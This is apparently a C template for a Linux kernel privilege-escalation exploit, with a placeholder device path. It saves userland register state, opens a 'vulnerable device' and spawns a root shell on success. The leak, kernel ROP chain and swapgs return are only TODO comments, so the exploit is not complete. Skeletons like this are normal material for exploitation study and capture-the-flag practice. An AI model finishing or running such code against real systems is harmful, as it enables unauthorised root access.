#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

static const char *device_path = "{device_path}";
static int device_fd = -1;

static uint64_t user_cs;
static uint64_t user_ss;
static uint64_t user_rflags;
static uint64_t user_sp;

static void die(const char *message) {
    fprintf(stderr, "[-] %s: %s\n", message, strerror(errno));
    exit(EXIT_FAILURE);
}

static void save_userland_state() {
    __asm__ volatile(
        ".intel_syntax noprefix;"
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushfq;"
        "pop %3;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_sp), "=r"(user_rflags)
        :
        : "memory"
    );
    puts("[+] Saved userland state");
}

static void spawn_shell() {
    uid_t uid = getuid();
    printf("[+] Returned to userland with uid=%d\n", uid);
    if (uid != 0) {
        fputs("[-] Privilege escalation failed\n", stderr);
        exit(EXIT_FAILURE);
    }
    execl("/bin/sh", "sh", NULL);
    die("execl");
}

static void open_device() {
    device_fd = open(device_path, O_RDWR);
    if (device_fd < 0) {
        die("open vulnerable device");
    }
    printf("[+] Opened %s\n", device_path);
}

int main() {
    save_userland_state();
    open_device();

    /*
     * TODO:
     *  1. Leak the stack canary and/or kernel addresses.
     *  2. Build the kernel ROP chain or alternate privilege-escalation payload.
     *  3. Return through swapgs_restore_regs_and_return_to_usermode, or use an
     *     equivalent trampoline, with spawn_shell as the user RIP.
     */
    close(device_fd);
    return EXIT_SUCCESS;
}
